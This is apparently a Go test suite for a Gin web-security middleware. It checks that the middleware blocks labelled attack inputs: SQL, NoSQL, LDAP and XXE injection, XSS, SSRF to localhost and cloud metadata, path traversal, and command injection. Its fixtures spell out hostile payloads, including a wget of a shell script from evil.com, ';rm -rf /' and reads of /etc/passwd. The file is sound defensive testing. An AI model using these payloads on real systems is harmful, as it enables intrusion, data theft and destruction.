package middleware

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
)

func TestOWASPSecurityMiddlewareSQLInjection(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name           string
		path           string
		query          string
		method         string
		body           string
		expectedBlock  bool
		expectedStatus int
	}{
		{
			name:           "Normal request - should pass",
			path:           "/api/test",
			query:          "name=John",
			method:         "GET",
			expectedBlock:  false,
			expectedStatus: http.StatusOK,
		},
		{
			name:           "SQL Injection - UNION SELECT",
			path:           "/api/user",
			query:          "id=1 UNION SELECT * FROM users",
			method:         "GET",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - OR 1=1",
			path:           "/api/login",
			query:          "username=admin' OR '1'='1",
			method:         "POST",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - DROP TABLE",
			path:           "/api/delete",
			query:          "table=users;DROP TABLE users",
			method:         "POST",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - Comment injection",
			path:           "/api/user",
			query:          "id=1--",
			method:         "GET",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - SLEEP",
			path:           "/api/wait",
			query:          "wait=SLEEP(5)",
			method:         "GET",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - INFORMATION_SCHEMA",
			path:           "/api/db",
			query:          "table=information_schema.tables",
			method:         "GET",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - INSERT INTO",
			path:           "/api/create",
			query:          "data=INSERT INTO users VALUES(1,'admin')",
			method:         "POST",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - EXEC",
			path:           "/api/exec",
			query:          "cmd=EXEC sp_executesql",
			method:         "POST",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
		{
			name:           "SQL Injection - CASE WHEN",
			path:           "/api/cond",
			query:          "cond=CASE WHEN 1=1 THEN 1 END",
			method:         "GET",
			expectedBlock:  true,
			expectedStatus: http.StatusForbidden,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.Any("/api/*path", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			var req *http.Request
			if tc.method == "POST" {
				req = httptest.NewRequest(tc.method, tc.path+"?"+tc.query, strings.NewReader(tc.body))
				req.Header.Set("Content-Type", "application/json")
			} else {
				req = httptest.NewRequest(tc.method, tc.path+"?"+tc.query, nil)
			}

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock {
				if w.Code != tc.expectedStatus {
					t.Errorf("Expected status %d, got %d for case: %s", tc.expectedStatus, w.Code, tc.name)
				}
			} else {
				if w.Code != http.StatusOK {
					t.Errorf("Expected status OK for case: %s, got %d", tc.name, w.Code)
				}
			}
		})
	}
}

func TestOWASPSecurityMiddlewareXSS(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name           string
		query          string
		body           string
		method         string
		expectedBlock  bool
	}{
		{
			name:          "Normal text - should pass",
			query:         "name=John",
			expectedBlock: false,
		},
		{
			name:          "XSS - script tag",
			query:         "name=<script>alert(1)</script>",
			expectedBlock: true,
		},
		{
			name:          "XSS - javascript protocol",
			query:         "name=<a href='javascript:alert(1)'>",
			expectedBlock: true,
		},
		{
			name:          "XSS - event handler",
			query:         "name=<img src=x onerror=alert(1)>",
			expectedBlock: true,
		},
		{
			name:          "XSS - iframe injection",
			query:         "name=<iframe src='http://evil.com'>",
			expectedBlock: true,
		},
		{
			name:          "XSS - SVG injection",
			query:         "name=<svg onload=alert(1)>",
			expectedBlock: true,
		},
		{
			name:          "XSS - template literal injection",
			query:         "name=${alert(1)}",
			expectedBlock: true,
		},
		{
			name:          "XSS - document.cookie",
			query:         "name=<script>document.cookie</script>",
			expectedBlock: true,
		},
		{
			name:          "XSS - innerHTML",
			query:         "name=<div innerHTML='<script>alert(1)</script>'>",
			expectedBlock: true,
		},
		{
			name:          "XSS - data URI",
			query:         "name=<a href='data:text/html,<script>alert(1)</script>'>",
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.GET("/test", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest(tc.method, "/test?"+tc.query, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for XSS case: %s", tc.name)
			}
		})
	}
}

func TestOWASPSecurityMiddlewareSSRF(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		query         string
		expectedBlock bool
	}{
		{
			name:          "Normal URL - should pass",
			query:         "url=https://example.com",
			expectedBlock: false,
		},
		{
			name:          "SSRF - localhost",
			query:         "url=http://localhost",
			expectedBlock: true,
		},
		{
			name:          "SSRF - 127.0.0.1",
			query:         "url=http://127.0.0.1",
			expectedBlock: true,
		},
		{
			name:          "SSRF - internal IP",
			query:         "url=http://192.168.1.1",
			expectedBlock: true,
		},
		{
			name:          "SSRF - AWS metadata",
			query:         "url=http://169.254.169.254/latest/meta-data/",
			expectedBlock: true,
		},
		{
			name:          "SSRF - file protocol",
			query:         "url=file:///etc/passwd",
			expectedBlock: true,
		},
		{
			name:          "SSRF - gopher protocol",
			query:         "url=gopher://127.0.0.1:6379",
			expectedBlock: true,
		},
		{
			name:          "SSRF - IPv6 localhost",
			query:         "url=http://[::1]",
			expectedBlock: true,
		},
		{
			name:          "SSRF - 10.x.x.x private",
			query:         "url=http://10.0.0.1/admin",
			expectedBlock: true,
		},
		{
			name:          "SSRF - Google Cloud metadata",
			query:         "url=http://metadata.google.internal/computeMetadata/v1/",
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.GET("/fetch", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("GET", "/fetch?"+tc.query, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for SSRF case: %s", tc.name)
			}
		})
	}
}

func TestOWASPSecurityMiddlewarePathTraversal(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		path          string
		expectedBlock bool
	}{
		{
			name:          "Normal path - should pass",
			path:          "/files/document.pdf",
			expectedBlock: false,
		},
		{
			name:          "Path Traversal - ../etc/passwd",
			path:          "/files/../../etc/passwd",
			expectedBlock: true,
		},
		{
			name:          "Path Traversal - encoded ../",
			path:          "/files/%2e%2e/%2e%2e/etc/passwd",
			expectedBlock: true,
		},
		{
			name:          "Path Traversal - URL encoded",
			path:          "/files/..%252f..%252fetc/passwd",
			expectedBlock: true,
		},
		{
			name:          "Path Traversal - null byte",
			path:          "/files/../../etc/passwd%00.txt",
			expectedBlock: true,
		},
		{
			name:          "Path Traversal - .git/config",
			path:          "/files/../../../.git/config",
			expectedBlock: true,
		},
		{
			name:          "Path Traversal - Windows style",
			path:          "/files/..\\..\\windows\\system32",
			expectedBlock: true,
		},
		{
			name:          "Path Traversal - double encoding",
			path:          "/files/%252e%252e%252f%252e%252e%252f",
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.GET("/files/*path", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("GET", tc.path, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for Path Traversal case: %s, got %d", tc.name, w.Code)
			}
		})
	}
}

func TestOWASPSecurityMiddlewareCommandInjection(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		path          string
		query         string
		expectedBlock bool
	}{
		{
			name:          "Normal command - should pass",
			path:          "/download",
			query:         "file=document.pdf",
			expectedBlock: false,
		},
		{
			name:          "Command Injection - shell metachar",
			path:          "/exec",
			query:         "cmd=;ls",
			expectedBlock: true,
		},
		{
			name:          "Command Injection - pipe",
			path:          "/exec",
			query:         "cmd=|cat /etc/passwd",
			expectedBlock: true,
		},
		{
			name:          "Command Injection - backtick",
			path:          "/exec",
			query:         "cmd=`id`",
			expectedBlock: true,
		},
		{
			name:          "Command Injection - $()",
			path:          "/exec",
			query:         "cmd=$(whoami)",
			expectedBlock: true,
		},
		{
			name:          "Command Injection - wget",
			path:          "/download",
			query:         "url=wget http://evil.com/shell.sh",
			expectedBlock: true,
		},
		{
			name:          "Command Injection - rm -rf",
			path:          "/delete",
			query:         "file=;rm -rf /",
			expectedBlock: true,
		},
		{
			name:          "Command Injection - chained commands",
			path:          "/exec",
			query:         "cmd=ls&&cat /etc/passwd",
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.GET("/download", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			router.GET("/exec", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("GET", tc.path+"?"+tc.query, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for Command Injection case: %s", tc.name)
			}
		})
	}
}

func TestOWASPSecurityMiddlewareLDAPInjection(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		body          string
		expectedBlock bool
	}{
		{
			name:          "Normal LDAP query - should pass",
			body:          `{"filter": "(uid=john)"}`,
			expectedBlock: false,
		},
		{
			name:          "LDAP Injection - wildcard",
			body:          `{"filter": "(uid=*)(objectClass=*)"}`,
			expectedBlock: true,
		},
		{
			name:          "LDAP Injection - OR injection",
			body:          `{"filter": "(uid=admin)(password=*)"}`,
			expectedBlock: true,
		},
		{
			name:          "LDAP Injection - comment",
			body:          `{"filter": "(uid=admin/*)"}`,
			expectedBlock: true,
		},
		{
			name:          "LDAP Injection - null byte",
			body:          `{"filter": "(uid=admin\x00)"}`,
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.POST("/ldap", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("POST", "/ldap", strings.NewReader(tc.body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for LDAP Injection case: %s", tc.name)
			}
		})
	}
}

func TestOWASPSecurityMiddlewareNoSQLInjection(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		body          string
		expectedBlock bool
	}{
		{
			name:          "Normal query - should pass",
			body:          `{"username": "john", "age": 25}`,
			expectedBlock: false,
		},
		{
			name:          "NoSQL Injection - $where",
			body:          `{"$where": "function() { return true; }"}`,
			expectedBlock: true,
		},
		{
			name:          "NoSQL Injection - $ne",
			body:          `{"username": {"$ne": null}}`,
			expectedBlock: true,
		},
		{
			name:          "NoSQL Injection - $or",
			body:          `{"$or": [{"admin": true}, {"active": {"$ne": false}}]}`,
			expectedBlock: true,
		},
		{
			name:          "NoSQL Injection - $regex",
			body:          `{"username": {"$regex": "^admin"}}`,
			expectedBlock: true,
		},
		{
			name:          "NoSQL Injection - $in",
			body:          `{"role": {"$in": ["admin", "superuser"]}}`,
			expectedBlock: true,
		},
		{
			name:          "NoSQL Injection - $exists",
			body:          `{"password": {"$exists": true}}`,
			expectedBlock: true,
		},
		{
			name:          "NoSQL Injection - sleep",
			body:          `{"$where": "sleep(5000)"}`,
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.POST("/query", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("POST", "/query", strings.NewReader(tc.body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for NoSQL Injection case: %s", tc.name)
			}
		})
	}
}

func TestOWASPSecurityMiddlewareXMLInjection(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		body          string
		expectedBlock bool
	}{
		{
			name:          "Normal JSON - should pass",
			body:          `{"name": "John", "email": "john@example.com"}`,
			expectedBlock: false,
		},
		{
			name:          "XML Injection - XXE",
			body:          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			expectedBlock: true,
		},
		{
			name:          "XML Injection - external entity",
			body:          `<!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">`,
			expectedBlock: true,
		},
		{
			name:          "XML Injection - CDATA",
			body:          `<![CDATA[<script>alert(1)</script>]]>`,
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.POST("/xml", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("POST", "/xml", strings.NewReader(tc.body))
			req.Header.Set("Content-Type", "application/xml")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for XML Injection case: %s", tc.name)
			}
		})
	}
}

func TestOWASPSecurityMiddlewareSecurityHeaders(t *testing.T) {
	gin.SetMode(gin.TestMode)

	router := gin.New()
	router.Use(OWASPSecurityMiddleware(OWASPConfig{
		Enabled:               true,
		EnforceHeaders:        true,
		EnableHeaderValidation: true,
	}))

	router.GET("/test", func(c *gin.Context) {
		c.Status(http.StatusOK)
	})

	req := httptest.NewRequest("GET", "/test", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Header().Get("X-Content-Type-Options") == "" {
		t.Error("Expected X-Content-Type-Options header to be set")
	}

	if w.Header().Get("X-Frame-Options") == "" {
		t.Error("Expected X-Frame-Options header to be set")
	}
}

func TestOWASPSecurityMiddlewareJSONPayload(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		payload       map[string]interface{}
		expectedBlock bool
	}{
		{
			name: "Normal JSON - should pass",
			payload: map[string]interface{}{
				"name":  "John",
				"email": "john@example.com",
			},
			expectedBlock: false,
		},
		{
			name: "JSON with XSS - should block",
			payload: map[string]interface{}{
				"comment": "<script>alert('xss')</script>",
			},
			expectedBlock: true,
		},
		{
			name: "JSON with SQL injection - should block",
			payload: map[string]interface{}{
				"query": "SELECT * FROM users WHERE id=1 OR 1=1",
			},
			expectedBlock: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.POST("/json", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			body, _ := json.Marshal(tc.payload)
			req := httptest.NewRequest("POST", "/json", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for JSON payload case: %s", tc.name)
			}
		})
	}
}

func TestOWASPSecurityMiddlewareComplianceResult(t *testing.T) {
	gin.SetMode(gin.TestMode)

	router := gin.New()
	router.Use(OWASPSecurityMiddleware())

	var complianceResult map[string]interface{}

	router.GET("/test", func(c *gin.Context) {
		if result, exists := c.Get("owasp_compliance"); exists {
			complianceResult = result.(map[string]interface{})
		}
		c.Status(http.StatusOK)
	})

	req := httptest.NewRequest("GET", "/test?name=John", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if complianceResult == nil {
		t.Error("Expected OWASP compliance result to be set in context")
	}

	if complianceResult["scan_id"] == nil {
		t.Error("Expected scan_id to be present in compliance result")
	}

	if complianceResult["checks"] == nil {
		t.Error("Expected checks to be present in compliance result")
	}
}

func TestOWASPConfigOptions(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		config        OWASPConfig
		testQuery     string
		expectedBlock bool
	}{
		{
			name: "SQL injection blocked by default",
			config: OWASPConfig{
				Enabled:            true,
				EnableSQLInjection: true,
			},
			testQuery:     "id=1 UNION SELECT * FROM users",
			expectedBlock: true,
		},
		{
			name: "SQL injection allowed when disabled",
			config: OWASPConfig{
				Enabled:            true,
				EnableSQLInjection: false,
			},
			testQuery:     "id=1 UNION SELECT * FROM users",
			expectedBlock: false,
		},
		{
			name: "XSS blocked by default",
			config: OWASPConfig{
				Enabled:             true,
				EnableXSSProtection: true,
			},
			testQuery:     "name=<script>alert(1)</script>",
			expectedBlock: true,
		},
		{
			name: "XSS allowed when disabled",
			config: OWASPConfig{
				Enabled:             true,
				EnableXSSProtection: false,
			},
			testQuery:     "name=<script>alert(1)</script>",
			expectedBlock: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware(tc.config))

			router.GET("/test", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("GET", "/test?"+tc.testQuery, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for case: %s", tc.name)
			}
			if !tc.expectedBlock && w.Code == http.StatusForbidden {
				t.Errorf("Expected no blocking for case: %s", tc.name)
			}
		})
	}
}

func TestOWASPMultipleAttacks(t *testing.T) {
	gin.SetMode(gin.TestMode)

	router := gin.New()
	router.Use(OWASPSecurityMiddleware())

	var blockedCategories []string

	router.POST("/api/*path", func(c *gin.Context) {
		c.Status(http.StatusOK)
	})

	testPayloads := []struct {
		name     string
		payload  string
		category string
	}{
		{
			name:     "SQL Injection",
			payload:  "query=SELECT * FROM users WHERE id=1 OR 1=1",
			category: "A03",
		},
		{
			name:     "XSS",
			payload:  "input=<script>alert(1)</script>",
			category: "A03",
		},
		{
			name:     "SSRF",
			payload:  "url=http://127.0.0.1/admin",
			category: "A10",
		},
	}

	for _, tp := range testPayloads {
		req := httptest.NewRequest("POST", "/api/test?"+tp.payload, nil)
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)

		if w.Code == http.StatusForbidden {
			blockedCategories = append(blockedCategories, tp.category)
		}
	}

	if len(blockedCategories) == 0 {
		t.Error("Expected at least some attacks to be blocked")
	}
}

func TestOWASPRequestBodyValidation(t *testing.T) {
	gin.SetMode(gin.TestMode)

	testCases := []struct {
		name          string
		body          string
		contentType   string
		expectedBlock bool
	}{
		{
			name:          "JSON with SQL injection in body",
			body:          `{"query": "SELECT * FROM users WHERE id=1"}`,
			contentType:   "application/json",
			expectedBlock: true,
		},
		{
			name:          "Form data with XSS",
			body:          "name=<script>alert(1)</script>",
			contentType:   "application/x-www-form-urlencoded",
			expectedBlock: true,
		},
		{
			name:          "Clean JSON body",
			body:          `{"name": "John", "age": 30}`,
			contentType:   "application/json",
			expectedBlock: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.POST("/test", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("POST", "/test", strings.NewReader(tc.body))
			req.Header.Set("Content-Type", tc.contentType)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for case: %s", tc.name)
			}
		})
	}
}

func TestOWASPAllOWASP2021Categories(t *testing.T) {
	gin.SetMode(gin.TestMode)

	categoryTests := map[string]struct {
		testQuery     string
		category      string
		expectedBlock bool
	}{
		"A01_BrokenAccessControl_PathTraversal": {
			testQuery:     "/files/../../../etc/passwd",
			category:      "A01",
			expectedBlock: true,
		},
		"A03_Injection_SQL": {
			testQuery:     "query=SELECT * FROM users",
			category:      "A03",
			expectedBlock: true,
		},
		"A03_Injection_XSS": {
			testQuery:     "input=<script>alert(1)</script>",
			category:      "A03",
			expectedBlock: true,
		},
		"A03_Injection_Command": {
			testQuery:     "cmd=;cat /etc/passwd",
			category:      "A03",
			expectedBlock: true,
		},
		"A10_SSRF": {
			testQuery:     "url=http://169.254.169.254",
			category:      "A10",
			expectedBlock: true,
		},
	}

	for name, tc := range categoryTests {
		t.Run(name, func(t *testing.T) {
			router := gin.New()
			router.Use(OWASPSecurityMiddleware())

			router.GET("/test", func(c *gin.Context) {
				c.Status(http.StatusOK)
			})

			req := httptest.NewRequest("GET", "/test?"+tc.testQuery, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.expectedBlock && w.Code != http.StatusForbidden {
				t.Errorf("Expected blocking for category %s case %s", tc.category, name)
			}
		})
	}
}
